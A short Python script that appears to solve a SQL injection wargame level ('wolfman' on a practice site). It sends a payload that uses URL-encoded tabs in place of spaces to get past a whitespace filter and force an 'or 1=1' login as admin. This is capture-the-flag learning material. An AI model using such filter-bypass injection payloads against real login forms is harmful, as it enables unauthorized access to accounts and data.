#!/usr/bin/env python3

'''
# Summary
- we can use TAB (%09) instead of WHITESPACE (%20)
'''


import requests

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"

payload = "?pw='%09or%091=1%09and%09id='admin"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")